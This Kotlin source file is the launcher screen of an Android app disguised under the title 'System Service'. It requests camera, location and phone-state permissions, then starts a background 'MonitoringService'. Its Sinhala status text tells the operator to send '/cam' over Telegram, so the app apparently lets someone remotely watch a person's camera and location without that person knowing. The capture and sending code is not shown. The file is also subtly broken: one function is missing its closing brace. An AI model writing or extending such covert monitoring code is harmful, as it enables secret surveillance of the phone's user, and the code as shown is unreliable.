package com.coc338781.childapp

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    private val PERMS = arrayOf(
        Manifest.permission.CAMERA,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_PHONE_STATE
    )

    private lateinit var statusText: TextView

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val layout = LinearLayout(this)
        layout.orientation = LinearLayout.VERTICAL
        layout.setPadding(50, 100, 50, 50)

        val title = TextView(this)
        title.text = "System Service"
        title.textSize = 24f
        layout.addView(title)

        statusText = TextView(this)
        statusText.text = "\n\nStatus: Ready"
        statusText.textSize = 14f
        layout.addView(statusText)

        val startBtn = Button(this)
        startBtn.text = "Start Monitoring"
        layout.addView(startBtn)

        startBtn.setOnClickListener {
            if (Build.VERSION.SDK_INT >= 33 &&
                ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
                != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this,
                    PERMS + Manifest.permission.POST_NOTIFICATIONS, 100)
            } else if (hasAll()) {
                startServiceNow()
            } else {
                ActivityCompat.requestPermissions(this, PERMS, 100)
            }
        }

        setContentView(layout)
    }

    private fun hasAll(): Boolean {
        for (p in PERMS) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED)
                return false
        }
        return true
    }

    private fun startServiceNow() {
    try {
        val intent = Intent(this, MonitoringService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
        statusText.text = "\n\nStatus: ✅ Monitoring Started!\n\nTelegram එකෙන් /cam යවන්න"
        Toast.makeText(this, "Monitoring started", Toast.LENGTH_LONG).show()
    } catch (e: Exception) {
        statusText.text = "\n\nStatus: ❌ Error\n${e.message}"
        Toast.makeText(this, "Error: ${e.message}", Toast.LENGTH_LONG).show()
    }

    override fun onRequestPermissionsResult(
        requestCode: Int, permissions: Array<out String>, grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (hasAll()) {
            Toast.makeText(this, "Permissions OK. Tap Start again.", Toast.LENGTH_LONG).show()
        }
    }
}
